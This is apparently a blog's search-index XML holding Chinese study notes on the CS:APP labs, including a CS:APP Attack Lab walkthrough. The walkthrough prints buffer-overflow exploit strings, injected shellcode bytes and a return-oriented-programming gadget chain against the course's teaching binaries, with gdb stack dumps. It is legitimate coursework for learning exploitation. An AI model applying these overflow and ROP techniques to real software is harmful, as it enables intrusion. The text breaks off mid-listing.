<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/project/2025/05/24/csapp/lab_toc/"/>
    <url>/project/2025/05/24/csapp/lab_toc/</url>
    
    <content type="html"><![CDATA[<p>包含八个实验的笔记</p><ul><li><p><em>Data Lab</em></p></li><li><p>对应第二章 信息的表示和处理</p><p>涉及整型 浮点数的表示和运算 </p><p>重点是理解补码 补码的范围 补码的加法 用补码加法表示做减法运算   利用取反~计算相反数 </p><p>理解算数移位和逻辑移位   对整型做逻辑运算！（非） </p><p>除法正数向下取整   和负数向上取整  （舍弃小数部分）  利用移位及加减运算实现乘除法</p><p>不使用减法 实现整数的大小比较</p><p> 浮点数的表示</p><blockquote><p>Students implement simple logical, two’s complement, and floating point functions, but using a highly restricted subset of C. For example, they might be asked to compute the absolute value of a number using only bit-level operations and straightline code. This lab helps students understand the bit-level representations of C data types and the bit-level behavior of the operations on data.</p></blockquote></li><li><p><em>Bomb Lab</em></p><p>对应第三章</p><p>学习汇编  数据访问（寻址方式 出入栈） 算数和逻辑运算 控制（条件码 跳转 循环 switch[跳转表]） 程序运行时（栈帧 转移控制 参数的传递 局部变量的存储）  数组的分配和访问（指针运算） 数据结构（struct union 数据对齐）  </p><p>c代码与汇编代码的对应关系</p><p>GDB调试</p><p>gcc从c到可执行文件的生成</p><blockquote><p>A “binary bomb” is a program provided to students as an object code file. When run, it prompts the user to type in 6 different strings. If any of these is incorrect, the bomb “explodes,” printing an error message and logging the event on a grading server. Students must “defuse” their own unique bomb by disassembling and reverse engineering the program to determine what the 6 strings should be. The lab teaches students to understand assembly language, and also forces them to learn how to use a debugger. It’s also great fun. A legendary lab among the CMU undergrads.</p><p>Here’s a <a href="http://csapp.cs.cmu.edu/3e/bomb.tar">Linux&#x2F;x86-64 binary bomb</a> that you can try out for yourself. The feature that notifies the grading server has been disabled, so feel free to explode this bomb with impunity. If you’re an instructor with a CS:APP account, then you can download the <a href="http://csapp.cs.cmu.edu/im/bomb-solution.txt">solution</a>.</p></blockquote></li><li><p><em>Attack Lab</em></p><p>对应第三章后面</p><p>缓存区溢出 对抗缓存区溢出（栈随机化 栈破坏检测）</p><p>学习CI和ROP代码攻击</p><blockquote><p>Note: This is the 64-bit successor to the 32-bit Buffer Lab.</p><p>Students are given a pair of unique custom-generated x86-64 binary executables, called targets, that have buffer overflow bugs. One target is vulnerable to code injection attacks. The other is vulnerable to return-oriented programming attacks. Students are asked to modify the behavior of the targets by developing exploits based on either code injection or return-oriented programming. This lab teaches the students about the stack discipline and teaches them about the danger of writing code that is vulnerable to buffer overflow attacks.</p><p>If you’re a self-study student, here are a pair of <a href="http://csapp.cs.cmu.edu/3e/target1.tar">Ubuntu 12.4 targets</a> that you can try out for yourself. You’ll need to run your targets using the <strong>“-q”</strong> option so that they don’t try to contact a non-existent grading server. If you’re an instructor with a CS:APP acount, you can download the solutions <a href="https://csapp.cs.cmu.edu/im/labs/target1-sol.tar">here</a>.</p></blockquote></li><li><p><em>Architecture Lab</em></p><p>对应第四章</p><p>自定义的Y86-64语言  hcl语言（描述处理器对指令的处理流程）</p><p>实现seq处理器（指令逐条运行）和pipe处理器 （流水线化的指令处理，其中涉及指令执行的五个阶段 {取值 译码 执行 访存   写回  更新PC} 五个阶段划分，使得指令全部可以用相似的流程执行）</p><p>pipe处理器流水线冒险，分为数据和控制冒险。数据冒险就是：下一条指令需要之前指令的计算结果；控制冒险就是：一条指令要确定下一指令的位置。了解冒险的触发条件 处理措施（暂停 bubble 转发）</p><blockquote><p>Note: Updated to Y86-64 for CS:APP3e.</p><p>Students are given a small default Y86-64 array copying function and a working pipelined Y86-64 processor design that runs the copy function in some nominal number of clock cycles per array element (CPE). The students attempt to minimize the CPE by modifying both the function and the processor design. This gives the students a deep appreciation for the interactions between hardware and software.</p><p>Note: The lab materials include the master source distribution of the Y86-64 processor simulators and the <em>Y86-64 Guide to Simulators</em>.</p></blockquote></li><li><p><em>Cache Lab</em></p><p>对应第六章</p><p>讲存储器体系层次，三级缓存，缓存的组织结构（S,E,B,m)。给定地址后如何在内存中寻找。缓存以块为单位进行数据交换。理解局部性。</p><p>lab主要是模拟cache的存取，以及结合cache特点编写局部性良好的矩阵转置函数（减少miss次数）</p><blockquote><p>At CMU we use this lab in place of the Performance Lab. Students write a general-purpose cache simulator, and then optimize a small matrix transpose kernel to minimize the number of misses on a simulated cache. This lab uses the Valgrind tool to generate address traces.</p><p>Note: This lab must be run on a 64-bit x86-64 system.</p></blockquote></li><li><p><em>Performance Lab</em></p><p>对应第五章 可略</p><blockquote><p>Students optimize the performance of an application kernel function such as convolution or matrix transposition. This lab provides a clear demonstration of the properties of cache memories and gives them experience with low-level program optimization.</p></blockquote></li><li><p><em>Shell Lab</em></p><p>对应第八章</p><p>主要讲异常控制流，异常可以分为四种。</p><p>（1）中断  外部IO引起 （2）故障 如缺页  （3）终止 如除法除以2、访问未定义虚拟内存  （4）陷阱 主要用于系统调用 如文件读写 进程控制</p><p>还讲了进程的概念，进程就是执行的程序，每个程序都运行在进程的上下文中，每个进程有自己的私有地址空间，包括只读代码段、变量段、堆、共享库映射区、用户栈和内核区域，进程有自己的逻辑控制流，也即是PC值的序列。重叠的逻辑控制流就是并发。</p><p>进程控制：进程创建和终止，子进程回收等</p><p>信号：用于通知进程发生了异常，信号包括很多种，可以人为设置阻塞，信号处理程序的编写需要注意很多事项，如与主程序共享的数据结构的访问保护，另外多进程之间的竞争是并发中常见的错误。</p><p>本章实验是完成一个简单的shell，其可以运行一些内置命令和可执行文件，并分为前台运行和后台运行，可以通过键盘ctrl-z、ctrl-c发送信号控制进程运行。</p><blockquote><p>Students implement their own simple Unix shell program with job control, including the ctrl-c and ctrl-z keystrokes, fg, bg, and jobs commands. This is the students’ first introduction to application level concurrency, and gives them a clear idea of Unix process control, signals, and signal handling.</p></blockquote></li><li><p><em>Malloc Lab</em></p><p>对应第九章</p><p>虚拟内存是对主存的抽象。虚拟地址经过MMU、快表TLB和页表，被翻译成物理地址，进而访问主存。</p><p>虚拟内存的内容是在磁盘上的，需要时缓存在主存上面，并以页为单位进行交换，可以将其称之为虚拟页和物理页。</p><p>使用页表记录虚拟页是否在主存上，页面是放在主存中的，由内核管理，内核为每个进程都提供了页表。页表条目简称为PTE，通过在PTE上设置许可位（如可读、可写、是否允许用户访问），可以保护内存。主存是全相联的，虚拟页可以缓存在任何物理页。</p><p>仿照cache的三级结构，页表也被存储在了快表TLB中，用于加速地址翻译。另外，通过多级页表，可以缩小页表大小，少占用内存。</p><p>OS利用虚拟内存的概念，为每个进程独立的虚拟地址空间，这样的好处是可以简化链接和简化加载，每个进程都有相似的虚拟地址空间区域结构，磁盘的ELF可执行文件的各个节直接映射到虚拟地址的区域。还可以简化共享，不同进程的可以共享同一物理页。还能简化内存分配，当进程申请新的堆空间时，直接为其分配虚拟地址空间，再映射到物理地址即可。</p><p>内存映射指的是虚拟内存区域和磁盘上的对象相关联。</p><p>堆用于动态内存分配，其是必须的，因为有些数据结构在运行后才知道大小。动态内存分配的主要问题是空闲块的记录和选择，空闲块的分割和合并。需要合理设计以提高请求和释放的处理速度，提高内存利用率。</p><p>本章实现是完成一个自己的动态内存分配器。</p><p>Students implement their own versions of malloc, free, and realloc. This lab gives students a clear understanding of data layout and organization, and requires them to evaluate different trade-offs between space and time efficiency. One of our favorite labs. When students finish this one, they really understand pointers!</p></li><li><p><em>Proxy Lab</em></p><p>对应第10、11、12章</p><p> 实现一个支持并发和缓存的cache，用到了线程编程、生产者消费者模型、读者写者模型、LRU。</p><blockquote><p>Students implement a concurrent caching Web proxy that sits between their browser and the rest of the World Wide Web. This lab exposes students to the interesting world of network programming, and ties together many of the concepts from the course, such as byte ordering, caching, process control, signals, signal handling, file I&#x2F;O, concurrency, and synchronization.</p></blockquote></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/project/2025/05/24/csapp/3,attack_lab(target)/"/>
    <url>/project/2025/05/24/csapp/3,attack_lab(target)/</url>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>学习两种代码攻击</p><p><img src="/project/./image/3,attack_lab(target)_image/image-20240506175616316.png" alt="image-20240506175616316"></p><h2 id="part1-CI"><a href="#part1-CI" class="headerlink" title="part1  CI"></a>part1  CI</h2><h4 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h4><p>attack.pdf实验要求：your exploit string will redirect the program to execute an existing procedure  </p><p>实验要求test函数跳到touch1的地址起点 </p><p><img src="/project/./image/3,attack_lab(target)_image/image-20240506185552628.png" alt="image-20240506185552628"></p><p>test调用getbuf</p><p><img src="/project/./image/3,attack_lab(target)_image/image-20240506185610853.png" alt="image-20240506185610853"></p><p><img src="/project/./image/3,attack_lab(target)_image/image-20240506185627087.png" alt="image-20240506185627087"></p><p>查看getbuf()函数  其分配的栈大小为0x28  将其填满，再溢出8字节后修改了返回地址 将其设置为touch1的地址即可</p><p>答案如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">c0</span> <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  /* <span class="hljs-number">00000000004017</span>c0 touch1地址 */<br></code></pre></td></tr></table></figure><p>修改后的栈区和返回地址如下：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">(gdb) x/<span class="hljs-number">6</span>gx $rsp<br><span class="hljs-number">0</span>x5561dc78:     <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0</span>x5561dc88:     <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0</span>x5561dc98:     <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x000000<span class="hljs-number">00004017c0</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;注意到注入代码（即输入的字符串）是从栈顶（低地址）开始写入的；<strong>返回地址修改时，要注意将地址反着填写</strong>&#x3D;&#x3D;</p><h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">touch2</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> val)</span><br>&#123;<br>vlevel = <span class="hljs-number">2</span>; <span class="hljs-comment">/* Part of validation protocol */</span><br><span class="hljs-keyword">if</span> (val == cookie) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);<br>validate(<span class="hljs-number">2</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);<br>fail(<span class="hljs-number">2</span>);<br> &#125;<br> <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br> &#125;<br></code></pre></td></tr></table></figure><p>要求执行到<code>printf(&quot;Touch2!: You called touch2(0x%.8x)\n&quot;, val);</code></p><p>本题还是利用gets读取溢出 从而修改栈中返回地址 将该地址指向注入代码（0x5561dc78） </p><p>在注入代码中实现修改变量val（将cookie赋给rdi即可）  并通过ret继续操控跳转方向（push ret)  (ret 是将栈顶值作为返回地址)</p><p>&#x3D;&#x3D;先写.s文件，汇编后生成.o文件，再反汇编生成.d文件，.d文件中有我们需要的指令代码&#x3D;&#x3D;</p><p>答案如下：  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">48</span> c7 c7 fa <span class="hljs-number">97</span> b9 <span class="hljs-number">59</span>     /* mov    $<span class="hljs-number">0</span>x59b997fa,%rdi  (attack code,adr:<span class="hljs-number">5561</span>dc78) */ <br><span class="hljs-attribute">68</span> ec <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>           /* pushq  $<span class="hljs-number">0</span>x4017ec  */ <br><span class="hljs-attribute">c3</span>                       /* retq           */ <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                    /* <span class="hljs-number">16</span>bytes */ <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                                  <br><span class="hljs-attribute">78</span> dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     /* modify getbuf return adr -&gt;<span class="hljs-number">5561</span>dc78 */ <br></code></pre></td></tr></table></figure><p>修改后的栈区和返回地址如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">(gdb) x/6gx $<span class="hljs-built_in">rsp</span><br><span class="hljs-number">0x5561dc78</span>:     <span class="hljs-number">0x6859b997fac7c748</span>      <span class="hljs-number">0x000000c3004017ec</span><br><span class="hljs-number">0x5561dc88</span>:     <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5561dc98</span>:     <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x000000005561dc78</span><br>(gdb) x/<span class="hljs-built_in">bx</span> <span class="hljs-number">0x5561dc78</span><br><span class="hljs-number">0x5561dc78</span>:     <span class="hljs-number">0x48</span><br><span class="hljs-number">0x5561dc79</span>:     <span class="hljs-number">0xc7</span><br><span class="hljs-number">0x5561dc7a</span>:     <span class="hljs-number">0xc7</span><br><span class="hljs-number">0x5561dc7b</span>:     <span class="hljs-number">0xfa</span><br><span class="hljs-number">0x5561dc7c</span>:     <span class="hljs-number">0x97</span><br><span class="hljs-number">0x5561dc7d</span>:     <span class="hljs-number">0xb9</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;<strong>注意到48 c7 c7 fa…是从低地址字节到高地址存放的，说明程序执行时，取指令是从低地址到高地址读取的。</strong>&#x3D;&#x3D;</p><h4 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>/* Compare string <span class="hljs-keyword">to</span> hex represention of unsigned value */<br><span class="hljs-symbol">2 </span><span class="hljs-keyword">int</span> hexmatch(unsigned <span class="hljs-keyword">val</span>, char *sval)<br><span class="hljs-symbol">3 </span>&#123;<br><span class="hljs-symbol">4 </span>char cbuf[<span class="hljs-number">110</span>];<br><span class="hljs-symbol">5 </span>/* Make position of check string unpredictable */<br><span class="hljs-symbol">6 </span>char *s = cbuf + random() % <span class="hljs-number">100</span>;<br><span class="hljs-symbol">7 </span>sprintf(s, <span class="hljs-string">&quot;%.8x&quot;</span>, <span class="hljs-keyword">val</span>);<br><span class="hljs-symbol">8 </span><span class="hljs-keyword">return</span> strncmp(sval, s, <span class="hljs-number">9</span>) == <span class="hljs-number">0</span>;<br><span class="hljs-symbol">9 </span>&#125;<br><span class="hljs-number">10</span><br><span class="hljs-symbol">11 </span>void touch3(char *sval)<br><span class="hljs-symbol">12 </span>&#123;<br><span class="hljs-symbol">13 </span>vlevel = <span class="hljs-number">3</span>; /* Part of validation protocol */<br><span class="hljs-symbol">14 </span><span class="hljs-keyword">if</span> (hexmatch(cookie, sval)) &#123;<br><span class="hljs-symbol">15 </span>printf(<span class="hljs-string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);<br><span class="hljs-symbol">16 </span>validate(<span class="hljs-number">3</span>);<br><span class="hljs-symbol">17 </span>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-symbol">18 </span>printf(<span class="hljs-string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);<br><span class="hljs-symbol">19 </span>fail(<span class="hljs-number">3</span>);<br><span class="hljs-symbol">20 </span>&#125;<br><span class="hljs-symbol">21 </span>exit(<span class="hljs-number">0</span>);<br><span class="hljs-symbol">22 </span>&#125;<br></code></pre></td></tr></table></figure><p>要求执行到<code>printf(&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;, sval);</code></p><p>那么，需要跳转到touch3，并输入合适的sval变量。</p><p>注意到需要hexmatch返回1，则需要hexmatch中strncmp返回0，即变量sval与s相等（sval和s均是字符串指针）</p><p><img src="/project/./image/3,attack_lab(target)_image/image-20240506221205325.png" alt="image-20240506221205325"></p><p>hexmatch中为变量cbuf开辟了128字节的栈区(0xff80&#x3D;-128)，cbuf指向栈顶；指针s指向栈顶后100个字节中的随机某一个，并通过sprintf函数从该位置存储cookie值。（cookie变成16进制，并作为字符串传递，即把“59b997fa”写入s指向地址开始的栈区）</p><p>综上，为了解决该题，我们需要找个位置存储cookie字符串，并把sval指向我们自己写的cookie字符串。</p><h5 id="错误思路"><a href="#错误思路" class="headerlink" title="错误思路"></a>错误思路</h5><p>考虑以下方法，若存到getbuf开辟的栈区（下图1位置），是不安全的，因为会被touch3和hexmatch函数给覆盖修改</p><p>若存到hexmatch函数的栈区之后（下图2位置），也不安全（经过验证，hexmatch执行完sprintf后，我们通过注入代码保存的cookie就消失了）。</p><p><img src="/project/./image/3,attack_lab(target)_image/image-20240506230212642.png" alt="image-20240506230212642"></p><h5 id="正确思路"><a href="#正确思路" class="headerlink" title="正确思路"></a>正确思路</h5><p>可以考虑存到test函数废弃的栈区(图中3位置)。</p><p>touch3的参数与cookie比较  要保证touch3参数不能被hexmatch覆盖</p><p><img src="/project/./image/3,attack_lab(target)_image/image-20240510143910361.png" alt="image-20240510143910361"></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tap">cookie 0x59b997fa   <br>其ascii<span class="hljs-number"> 35 </span>39<span class="hljs-number"> 62 </span>39<span class="hljs-number"> 39 </span>37<span class="hljs-number"> 66 </span>61  &quot;59b997fa&quot;  存到$0x5561dca8<br><br><br>0000000000000000 &lt;.text&gt;:<br>   0:48 c7 c7 a8 dc<span class="hljs-number"> 61 </span>55 mov    $0x5561dca8,%rdi<br>   7:68 fa<span class="hljs-number"> 18 </span>40<span class="hljs-number"> 00 </span>      pushq  $0x4018fa   (touch3)<br>   c:c3                   retq   <br><br><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">48</span> c7 c7 a8 dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">68</span> <br><span class="hljs-attribute">fa</span> <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> c3 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>               <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>      <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                                 <br><span class="hljs-attribute">78</span> dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     /* modify getbuf return adr -&gt;<span class="hljs-number">5561</span>dc78 */<br><span class="hljs-attribute">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span>    /* cookie放入test栈区 */<br><br></code></pre></td></tr></table></figure><p>查看一下栈区 其中0x5561dca用于存放cookie字符串</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">(gdb) x/7gx $<span class="hljs-built_in">rsp</span><br><span class="hljs-number">0x5561dc78</span>:     <span class="hljs-number">0x685561dca8c7c748</span>      <span class="hljs-number">0x000000c3004018fa</span><br><span class="hljs-number">0x5561dc88</span>:     <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5561dc98</span>:     <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x000000005561dc78</span><br><span class="hljs-number">0x5561dca8</span>:     <span class="hljs-number">0x6166373939623935</span><br></code></pre></td></tr></table></figure><h2 id="part2-Return-Oriented-Programming"><a href="#part2-Return-Oriented-Programming" class="headerlink" title="part2 Return-Oriented Programming"></a>part2 Return-Oriented Programming</h2><p>使用了栈随机化和栈不可执行 用于保护程序 </p><p>要求利用farm.c生成汇编代码，利用其中多个ret结尾的代码段（称之为gadget），完成与part1的level2和3相同的攻击</p><h4 id="level2-1"><a href="#level2-1" class="headerlink" title="level2"></a>level2</h4><p>栈溢出攻击时，需要返回地址指向我们的攻击代码，栈随机化后，攻击代码的位置就不确定了，因此用栈溢出来攻击就失效了。</p><p>而程序代码的地址没有随机化，可以利用程序汇编代码的切片进行攻击。</p><p>本题提示：<strong>两个gadget即可完成攻击</strong>；只需要从functions between start_farm and mid_farm之中找。</p><p>由于farm中没有我们要的cookie或者是touch2的地址，cookie和touch2地址肯定是通过栈区即pop指令进行传递。</p><p>逻辑如下：在栈区中只存放返回地址和一些参数，利用gadget实现参数的取用，并ret跳转到下一个gadget或者是其他函数。</p><p>&#x3D;&#x3D;这也是为什么叫做ROP，即利用return和栈区写入地址引导gadget。&#x3D;&#x3D;</p><img src="./image/3,attack_lab(target)_image/image-20240510200036773.png" alt="image-20240510200036773" style="zoom:67%;" /><p>第一步是pop，从栈区取cookie到寄存器，第二部是movq，进行参数传递，传到rdi。</p><p><img src="/project/./image/3,attack_lab(target)_image/image-20240510214408829.png" alt="image-20240510214408829"></p><p>在farm中，先找58-5f，并且要求其后面只有0x90(nop)或者0xc3(ret)。  只有一个58 90 c3满足要求 ，即 pop %rax</p><p>然后，肯定是找movq %rax,%rdi 即48 89 c7 c3 以及48 89 c7 90 c3</p><p>故答案为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">ab</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  /* gadget1 */<br><span class="hljs-attribute">fa</span> <span class="hljs-number">97</span> b9 <span class="hljs-number">59</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>   /* cookie=<span class="hljs-number">0</span>x59b997fa */<br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  /* gadget2 */<br><span class="hljs-attribute">ec</span> <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  /* touch2=<span class="hljs-number">0</span>x4017ec */<br></code></pre></td></tr></table></figure><p>farm参考如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 